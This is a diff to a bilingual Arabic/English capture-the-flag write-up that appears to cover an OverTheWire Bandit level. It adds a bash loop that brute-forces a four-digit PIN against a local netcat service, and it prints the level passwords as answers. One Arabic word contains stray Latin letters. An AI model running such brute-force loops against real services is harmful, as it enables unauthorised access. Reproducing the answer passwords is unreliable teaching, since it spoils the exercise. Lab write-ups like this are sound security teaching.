@@ -173,3 +173,26 @@ The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
 **الحكم النهائي:** لقد قمنا بحل مشكلة كان من المستحil حلها يدويًا في غضون ثوانٍ باستخدام حلقة `for` بسيطة وبعض أدوات لينكس الأساسية. هذا يوضح الأهمية الجوهرية للأتمتة والمنطق البرمجي في مجال الأمن السيبراني.
 
 **كلمة السر للمستوى `bandit25` هي: `iCi86ttT4KSNe1armKiwbQNmB3YJP3q4`**
+
+---
+
+## 🇺🇸 English
+
+### Objective
+Brute-force a 4-digit PIN to get the next password.
+
+### Command
+```bash
+for i in {0000..9999}; do echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"; done | nc localhost 30002 | grep -v "Wrong"
+```
+
+### Explanation
+- `for i in {0000..9999}`: Loop through all 10000 PINs
+- `echo "password $i"`: Generate each attempt
+- `nc localhost 30002`: Send to service
+- `grep -v "Wrong"`: Show only correct response
+
+### Key Takeaways
+- **Brute Force:** Automate repetitive attempts with loops
+- **Bash Scripting:** Essential for penetration testing
+- **Filtering:** Use `grep -v` to exclude unwanted output
